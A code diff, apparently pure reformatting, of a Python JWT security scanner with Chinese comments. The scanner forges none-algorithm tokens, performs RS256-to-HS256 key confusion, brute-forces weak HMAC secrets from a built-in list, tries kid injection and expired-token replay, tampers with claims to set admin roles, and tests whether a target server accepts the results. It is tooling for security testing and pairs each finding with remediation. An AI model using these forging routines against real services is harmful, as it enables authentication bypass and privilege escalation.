@@ -24,6 +24,7 @@ logger = logging.getLogger(__name__)
 # 统一 HTTP 客户端工厂
 try:
     from core.http import get_sync_client
+
     HAS_HTTP_FACTORY = True
 except ImportError:
     HAS_HTTP_FACTORY = False
@@ -31,20 +32,22 @@ except ImportError:
 
 class JWTVulnType(Enum):
     """JWT漏洞类型"""
-    NONE_ALGORITHM = "none_algorithm"           # None算法攻击
+
+    NONE_ALGORITHM = "none_algorithm"  # None算法攻击
     ALGORITHM_CONFUSION = "algorithm_confusion"  # RS256->HS256混淆
-    WEAK_SECRET = "weak_secret"                 # 弱密钥
-    MISSING_EXPIRY = "missing_expiry"           # 缺少过期时间
-    EXPIRED_ACCEPTED = "expired_accepted"       # 接受过期Token
-    KID_INJECTION = "kid_injection"             # KID参数注入
-    JKU_INJECTION = "jku_injection"             # JKU参数注入
-    JWK_INJECTION = "jwk_injection"             # JWK嵌入攻击
+    WEAK_SECRET = "weak_secret"  # 弱密钥
+    MISSING_EXPIRY = "missing_expiry"  # 缺少过期时间
+    EXPIRED_ACCEPTED = "expired_accepted"  # 接受过期Token
+    KID_INJECTION = "kid_injection"  # KID参数注入
+    JKU_INJECTION = "jku_injection"  # JKU参数注入
+    JWK_INJECTION = "jwk_injection"  # JWK嵌入攻击
     SIGNATURE_NOT_VERIFIED = "signature_not_verified"  # 签名未验证
 
 
 @dataclass
 class JWTVulnerability:
     """JWT漏洞结果"""
+
     vuln_type: JWTVulnType
     severity: str
     description: str
@@ -58,6 +61,7 @@ class JWTVulnerability:
 @dataclass
 class JWTInfo:
     """JWT解析信息"""
+
     header: Dict[str, Any]
     payload: Dict[str, Any]
     signature: str
@@ -72,24 +76,58 @@ class JWTSecurityTester:
     # 常见弱密钥列表 (扩展版)
     WEAK_SECRETS = [
         # 常见默认密钥
-        "secret", "password", "123456", "admin", "key", "jwt",
-        "jwt_secret", "jwt-secret", "secret123", "password123",
-        "changeme", "mysecret", "supersecret", "defaultsecret",
-        "your-256-bit-secret", "your-secret-key", "my-secret-key",
+        "secret",
+        "password",
+        "123456",
+        "admin",
+        "key",
+        "jwt",
+        "jwt_secret",
+        "jwt-secret",
+        "secret123",
+        "password123",
+        "changeme",
+        "mysecret",
+        "supersecret",
+        "defaultsecret",
+        "your-256-bit-secret",
+        "your-secret-key",
+        "my-secret-key",
         # 框架默认
-        "django-insecure-key", "rails_secret", "laravel_secret",
-        "express_secret", "flask_secret", "spring_secret",
+        "django-insecure-key",
+        "rails_secret",
+        "laravel_secret",
+        "express_secret",
+        "flask_secret",
+        "spring_secret",
         # 简单模式
-        "1234567890", "0987654321", "qwerty", "letmein",
-        "abc123", "test", "demo", "development", "production",
+        "1234567890",
+        "0987654321",
+        "qwerty",
+        "letmein",
+        "abc123",
+        "test",
+        "demo",
+        "development",
+        "production",
         # 空值和特殊
-        "", " ", "null", "undefined", "none",
+        "",
+        " ",
+        "null",
+        "undefined",
+        "none",
     ]
 
     # None算法变体
     NONE_ALGORITHM_VARIANTS = [
-        "none", "None", "NONE", "nOnE",
-        "none ", " none", "none\t", "\tnone",
+        "none",
+        "None",
+        "NONE",
+        "nOnE",
+        "none ",
+        " none",
+        "none\t",
+        "\tnone",
     ]
 
     # KID注入Payloads
@@ -123,21 +161,21 @@ class JWTSecurityTester:
             self._session = get_sync_client(proxy=proxy, force_new=True)
         else:
             self._session = requests.Session()
-        self._session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        })
+        self._session.headers.update(
+            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        )
 
     @staticmethod
     def base64url_encode(data: bytes) -> str:
         """Base64 URL安全编码"""
-        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")
 
     @staticmethod
     def base64url_decode(data: str) -> bytes:
         """Base64 URL安全解码"""
         padding = 4 - len(data) % 4
         if padding != 4:
-            data += '=' * padding
+            data += "=" * padding
         return base64.urlsafe_b64decode(data)
 
     def decode_jwt(self, token: str) -> JWTInfo:
@@ -151,41 +189,42 @@ class JWTSecurityTester:
             JWTInfo对象包含header、payload、signature
         """
         try:
-            parts = token.split('.')
+            parts = token.split(".")
             if len(parts) != 3:
                 return JWTInfo(
-                    header={}, payload={}, signature="",
+                    header={},
+                    payload={},
+                    signature="",
                     is_valid_format=False,
-                    error=f"无效JWT格式: 期望3部分, 得到{len(parts)}部分"
+                    error=f"无效JWT格式: 期望3部分, 得到{len(parts)}部分",
                 )
 
             header = json.loads(self.base64url_decode(parts[0]))
             payload = json.loads(self.base64url_decode(parts[1]))
             signature = parts[2]
-            algorithm = header.get('alg', 'unknown')
+            algorithm = header.get("alg", "unknown")
 
             return JWTInfo(
                 header=header,
                 payload=payload,
                 signature=signature,
                 algorithm=algorithm,
-                is_valid_format=True
+                is_valid_format=True,
             )
         except json.JSONDecodeError as e:
             return JWTInfo(
-                header={}, payload={}, signature="",
+                header={},
+                payload={},
+                signature="",
                 is_valid_format=False,
-                error=f"JSON解析失败: {e}"
+                error=f"JSON解析失败: {e}",
             )
         except Exception as e:
             return JWTInfo(
-                header={}, payload={}, signature="",
-                is_valid_format=False,
-                error=f"解码失败: {e}"
+                header={}, payload={}, signature="", is_valid_format=False, error=f"解码失败: {e}"
             )
 
-    def forge_jwt(self, header: Dict, payload: Dict,
-                  signature: str = "") -> str:
+    def forge_jwt(self, header: Dict, payload: Dict, signature: str = "") -> str:
         """
         构造JWT
 
@@ -197,20 +236,21 @@ class JWTSecurityTester:
         Returns:
             构造的JWT字符串
         """
-        header_b64 = self.base64url_encode(json.dumps(header, separators=(',', ':')).encode())
-        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
+        header_b64 = self.base64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
         return f"{header_b64}.{payload_b64}.{signature}"
 
     def sign_hs256(self, header: Dict, payload: Dict, secret: str) -> str:
         """使用HS256签名JWT"""
-        header_b64 = self.base64url_encode(json.dumps(header, separators=(',', ':')).encode())
-        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
+        header_b64 = self.base64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
         message = f"{header_b64}.{payload_b64}".encode()
         signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
         return f"{header_b64}.{payload_b64}.{self.base64url_encode(signature)}"
 
-    def _verify_token(self, url: str, token: str,
-                      headers: Optional[Dict] = None) -> Tuple[bool, int, str]:
+    def _verify_token(
+        self, url: str, token: str, headers: Optional[Dict] = None
+    ) -> Tuple[bool, int, str]:
         """
         验证Token是否被服务器接受
 
@@ -226,7 +266,7 @@ class JWTSecurityTester:
                 headers=test_headers,
                 timeout=self.timeout,
                 proxies=self.proxies,
-                allow_redirects=False
+                allow_redirects=False,
             )
 
             # 判断是否被接受 (非401/403通常表示接受)
@@ -238,8 +278,9 @@ class JWTSecurityTester:
         except requests.RequestException as e:
             return False, 0, str(e)
 
-    def test_none_algorithm(self, token: str, url: str = "",
-                            headers: Optional[Dict] = None) -> Dict[str, Any]:
+    def test_none_algorithm(
+        self, token: str, url: str = "", headers: Optional[Dict] = None
+    ) -> Dict[str, Any]:
         """
         测试None算法攻击
 
@@ -258,7 +299,7 @@ class JWTSecurityTester:
             "description": "JWT使用None算法可导致签名绕过",
             "tests": [],
             "forged_tokens": [],
-            "remediation": "在服务端强制验证算法类型,拒绝none算法"
+            "remediation": "在服务端强制验证算法类型,拒绝none算法",
         }
 
         jwt_info = self.decode_jwt(token)
@@ -269,14 +310,11 @@ class JWTSecurityTester:
         # 尝试所有None变体
         for none_variant in self.NONE_ALGORITHM_VARIANTS:
             forged_header = jwt_info.header.copy()
-            forged_header['alg'] = none_variant
+            forged_header["alg"] = none_variant
 
             # 构造无签名的Token
             forged_token = self.forge_jwt(forged_header, jwt_info.payload, "")
-            result["forged_tokens"].append({
-                "variant": none_variant,
-                "token": forged_token
-            })
+            result["forged_tokens"].append({"variant": none_variant, "token": forged_token})
 
             test_result = {"variant": none_variant, "token": forged_token}
 
@@ -294,9 +332,9 @@ class JWTSecurityTester:
 
         return result
 
-    def test_algorithm_confusion(self, token: str, url: str = "",
-                                  public_key: str = "",
-                                  headers: Optional[Dict] = None) -> Dict[str, Any]:
+    def test_algorithm_confusion(
+        self, token: str, url: str = "", public_key: str = "", headers: Optional[Dict] = None
+    ) -> Dict[str, Any]:
         """
         测试算法混淆攻击 (RS256 -> HS256)
 
@@ -315,7 +353,7 @@ class JWTSecurityTester:
             "description": "将RS256改为HS256,使用公钥作为HMAC密钥可绕过签名验证",
             "original_algorithm": "",
             "forged_token": "",
-            "remediation": "验证算法类型与预期一致,不依赖header中的alg声明"
+            "remediation": "验证算法类型与预期一致,不依赖header中的alg声明",
         }
 
         jwt_info = self.decode_jwt(token)
@@ -326,7 +364,7 @@ class JWTSecurityTester:
         result["original_algorithm"] = jwt_info.algorithm
 
         # 检查是否为RS算法
-        if not jwt_info.algorithm.upper().startswith('RS'):
+        if not jwt_info.algorithm.upper().startswith("RS"):
             result["skipped"] = True
             result["reason"] = f"原始算法为{jwt_info.algorithm},不适用于此攻击"
             return result
@@ -339,7 +377,7 @@ class JWTSecurityTester:
 
         # 构造HS256签名的Token (使用公钥作为secret)
         forged_header = jwt_info.header.copy()
-        forged_header['alg'] = 'HS256'
+        forged_header["alg"] = "HS256"
 
         forged_token = self.sign_hs256(forged_header, jwt_info.payload, public_key)
         result["forged_token"] = forged_token
@@ -355,8 +393,9 @@ class JWTSecurityTester:
 
         return result
 
-    def test_weak_secrets(self, token: str,
-                          custom_secrets: Optional[List[str]] = None) -> Dict[str, Any]:
+    def test_weak_secrets(
+        self, token: str, custom_secrets: Optional[List[str]] = None
+    ) -> Dict[str, Any]:
         """
         测试弱密钥
 
@@ -371,7 +410,7 @@ class JWTSecurityTester:
             "description": "JWT使用弱密钥可被暴力破解",
             "found_secret": "",
             "attempts": 0,
-            "remediation": "使用至少256位的随机密钥"
+            "remediation": "使用至少256位的随机密钥",
         }
 
         jwt_info = self.decode_jwt(token)
@@ -380,7 +419,7 @@ class JWTSecurityTester:
             return result
 
         # 仅适用于HMAC算法
-        if not jwt_info.algorithm.upper().startswith('HS'):
+        if not jwt_info.algorithm.upper().startswith("HS"):
             result["skipped"] = True
             result["reason"] = f"算法{jwt_info.algorithm}不使用对称密钥"
             return result
@@ -390,7 +429,7 @@ class JWTSecurityTester:
             secrets_to_try.extend(custom_secrets)
 
         # 获取原始签名
-        parts = token.split('.')
+        parts = token.split(".")
         original_signature = parts[2]
         message = f"{parts[0]}.{parts[1]}".encode()
 
@@ -399,11 +438,11 @@ class JWTSecurityTester:
 
             try:
                 # 计算签名
-                if jwt_info.algorithm.upper() == 'HS256':
+                if jwt_info.algorithm.upper() == "HS256":
                     computed = hmac.new(secret.encode(), message, hashlib.sha256).digest()
-                elif jwt_info.algorithm.upper() == 'HS384':
+                elif jwt_info.algorithm.upper() == "HS384":
                     computed = hmac.new(secret.encode(), message, hashlib.sha384).digest()
-                elif jwt_info.algorithm.upper() == 'HS512':
+                elif jwt_info.algorithm.upper() == "HS512":
                     computed = hmac.new(secret.encode(), message, hashlib.sha512).digest()
                 else:
                     continue
@@ -421,8 +460,9 @@ class JWTSecurityTester:
 
         return result
 
-    def test_expiry_bypass(self, token: str, url: str = "",
-                           headers: Optional[Dict] = None) -> Dict[str, Any]:
+    def test_expiry_bypass(
+        self, token: str, url: str = "", headers: Optional[Dict] = None
+    ) -> Dict[str, Any]:
         """
         测试过期Token是否被接受
         """
@@ -433,7 +473,7 @@ class JWTSecurityTester:
             "description": "服务器接受过期的JWT",
             "token_exp": None,
             "is_expired": False,
-            "remediation": "服务端必须验证exp声明"
+            "remediation": "服务端必须验证exp声明",
         }
 
         jwt_info = self.decode_jwt(token)
@@ -441,7 +481,7 @@ class JWTSecurityTester:
             result["error"] = jwt_info.error
             return result
 
-        exp = jwt_info.payload.get('exp')
+        exp = jwt_info.payload.get("exp")
 
         if exp is None:
             result["vuln_type"] = "missing_expiry"
@@ -451,7 +491,7 @@ class JWTSecurityTester:
             return result
 
         result["token_exp"] = exp
-        result["exp_datetime"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(exp))
+        result["exp_datetime"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(exp))
         result["is_expired"] = exp < time.time()
 
         if result["is_expired"] and url:
@@ -462,8 +502,9 @@ class JWTSecurityTester:
 
         return result
 
-    def test_kid_injection(self, token: str, url: str = "",
-                           headers: Optional[Dict] = None) -> Dict[str, Any]:
+    def test_kid_injection(
+        self, token: str, url: str = "", headers: Optional[Dict] = None
+    ) -> Dict[str, Any]:
         """
         测试KID参数注入 (路径遍历/SQL注入)
         """
@@ -474,7 +515,7 @@ class JWTSecurityTester:
             "description": "JWT的kid参数可能存在注入漏洞",
             "original_kid": "",
             "tests": [],
-            "remediation": "对kid参数进行严格验证和过滤"
+            "remediation": "对kid参数进行严格验证和过滤",
         }
 
         jwt_info = self.decode_jwt(token)
@@ -482,22 +523,19 @@ class JWTSecurityTester:
             result["error"] = jwt_info.error
             return result
 
-        original_kid = jwt_info.header.get('kid', '')
+        original_kid = jwt_info.header.get("kid", "")
         result["original_kid"] = original_kid
 
         if not url:
             result["skipped"] = True
             result["reason"] = "需要提供URL进行验证"
             # 仍然生成测试Payloads供手动测试
-            result["payloads"] = [
-                {"kid": p[0], "type": p[1]}
-                for p in self.KID_INJECTION_PAYLOADS
-            ]
+            result["payloads"] = [{"kid": p[0], "type": p[1]} for p in self.KID_INJECTION_PAYLOADS]
             return result
 
         for payload, injection_type in self.KID_INJECTION_PAYLOADS:
             forged_header = jwt_info.header.copy()
-            forged_header['kid'] = payload
+            forged_header["kid"] = payload
 
             # 对于/dev/null路径遍历,使用空密钥签名
             if injection_type == "null_file":
@@ -512,7 +550,7 @@ class JWTSecurityTester:
                 "payload": payload,
                 "type": injection_type,
                 "accepted": accepted,
-                "status_code": status
+                "status_code": status,
             }
             result["tests"].append(test_result)
 
@@ -522,8 +560,9 @@ class JWTSecurityTester:
 
         return result
 
-    def test_signature_verification(self, token: str, url: str = "",
-                                     headers: Optional[Dict] = None) -> Dict[str, Any]:
+    def test_signature_verification(
+        self, token: str, url: str = "", headers: Optional[Dict] = None
+    ) -> Dict[str, Any]:
         """
         测试签名是否被验证
         """
@@ -532,7 +571,7 @@ class JWTSecurityTester:
             "vuln_type": "signature_not_verified",
             "severity": "critical",
             "description": "服务器未验证JWT签名",
-            "remediation": "必须验证JWT签名"
+            "remediation": "必须验证JWT签名",
         }
 
         jwt_info = self.decode_jwt(token)
@@ -549,12 +588,12 @@ class JWTSecurityTester:
         tampered_payload = jwt_info.payload.copy()
 
         # 尝试提权
-        if 'role' in tampered_payload:
-            tampered_payload['role'] = 'admin'
-        if 'admin' in tampered_payload:
-            tampered_payload['admin'] = True
-        if 'user_id' in tampered_payload:
-            tampered_payload['user_id'] = 1
+        if "role" in tampered_payload:
+            tampered_payload["role"] = "admin"
+        if "admin" in tampered_payload:
+            tampered_payload["admin"] = True
+        if "user_id" in tampered_payload:
+            tampered_payload["user_id"] = 1
 
         # 使用原签名构造新Token
         tampered_token = self.forge_jwt(jwt_info.header, tampered_payload, jwt_info.signature)
@@ -571,10 +610,14 @@ class JWTSecurityTester:
 
         return result
 
-    def full_scan(self, token: str, url: str = "",
-                  public_key: str = "",
-                  custom_secrets: Optional[List[str]] = None,
-                  headers: Optional[Dict] = None) -> Dict[str, Any]:
+    def full_scan(
+        self,
+        token: str,
+        url: str = "",
+        public_key: str = "",
+        custom_secrets: Optional[List[str]] = None,
+        headers: Optional[Dict] = None,
+    ) -> Dict[str, Any]:
         """
         完整JWT安全扫描
 
@@ -594,11 +637,7 @@ class JWTSecurityTester:
             "jwt_info": {},
             "vulnerabilities": [],
             "tests": {},
-            "summary": {
-                "total_tests": 0,
-                "vulnerable_count": 0,
-                "highest_severity": "none"
-            }
+            "summary": {"total_tests": 0, "vulnerable_count": 0, "highest_severity": "none"},
         }
 
         # 解析JWT
@@ -610,7 +649,7 @@ class JWTSecurityTester:
         result["jwt_info"] = {
             "algorithm": jwt_info.algorithm,
             "header": jwt_info.header,
-            "payload": jwt_info.payload
+            "payload": jwt_info.payload,
         }
 
         severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}
@@ -619,11 +658,17 @@ class JWTSecurityTester:
         # 执行所有测试
         tests = [
             ("none_algorithm", lambda: self.test_none_algorithm(token, url, headers)),
-            ("algorithm_confusion", lambda: self.test_algorithm_confusion(token, url, public_key, headers)),
+            (
+                "algorithm_confusion",
+                lambda: self.test_algorithm_confusion(token, url, public_key, headers),
+            ),
             ("weak_secret", lambda: self.test_weak_secrets(token, custom_secrets)),
             ("expiry_bypass", lambda: self.test_expiry_bypass(token, url, headers)),
             ("kid_injection", lambda: self.test_kid_injection(token, url, headers)),
-            ("signature_verification", lambda: self.test_signature_verification(token, url, headers)),
+            (
+                "signature_verification",
+                lambda: self.test_signature_verification(token, url, headers),
+            ),
         ]
 
         for test_name, test_func in tests:
@@ -639,12 +684,14 @@ class JWTSecurityTester:
                     if severity_order.get(severity, 0) > severity_order.get(highest_severity, 0):
                         highest_severity = severity
 
-                    result["vulnerabilities"].append({
-                        "type": test_name,
-                        "severity": severity,
-                        "proof": test_result.get("proof", ""),
-                        "remediation": test_result.get("remediation", "")
-                    })
+                    result["vulnerabilities"].append(
+                        {
+                            "type": test_name,
+                            "severity": severity,
+                            "proof": test_result.get("proof", ""),
+                            "remediation": test_result.get("remediation", ""),
+                        }
+                    )
 
             except Exception as e:
                 logger.error(f"测试{test_name}失败: {e}")
@@ -663,7 +710,7 @@ def quick_jwt_scan(token: str, url: str = "") -> Dict[str, Any]:
 
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
     # 测试示例
     test_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
 
